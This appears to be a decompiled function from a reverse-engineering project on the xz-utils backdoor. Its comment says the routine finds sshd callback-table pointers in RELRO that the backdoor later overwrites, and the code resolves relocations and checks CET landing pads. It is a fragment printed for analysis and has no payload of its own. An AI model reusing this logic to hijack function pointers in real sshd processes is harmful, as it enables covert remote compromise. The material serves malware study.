// /home/kali/xzre-ghidra/xzregh/102A50_elf_find_function_pointer.c
// Function: elf_find_function_pointer @ 0x102A50
// Calling convention: unknown
// Prototype: undefined elf_find_function_pointer(void)


/*
 * AutoDoc: Takes a string-reference catalogue entry, locates the associated RELRO slot, and checks CET landing requirements before returning the pointer. The loader relies on it to identify sshd callback tables—such as monitor handlers—that it will later overwrite with backdoor functions.
 */
#include "xzre_types.h"


bool elf_find_function_pointer
               (uint param_1,long *param_2,undefined8 *param_3,long *param_4,undefined8 param_5,
               long param_6,int *param_7)

{
  int iVar1;
  long lVar2;
  
  param_6 = param_6 + (ulong)param_1 * 0x20;
  lVar2 = *(long *)(param_6 + 8);
  if (lVar2 == 0) {
    return FALSE;
  }
  *param_2 = lVar2;
  *param_3 = *(undefined8 *)(param_6 + 0x10);
  lVar2 = elf_find_rela_reloc(param_5,*param_2,0,0,0);
  *param_4 = lVar2;
  if (lVar2 == 0) {
    lVar2 = elf_find_relr_reloc(param_5,*param_2,0,0,0);
    *param_4 = lVar2;
    if (lVar2 == 0) {
      return FALSE;
    }
  }
  iVar1 = elf_contains_vaddr_relro(param_5,*param_4 + -8,0x10,1);
  if (iVar1 == 0) {
    return FALSE;
  }
  if (*param_7 != 0) {
    iVar1 = is_endbr64_instruction(*param_2,*param_2 + 4,0xe230);
    return iVar1 != 0;
  }
  return TRUE;
}

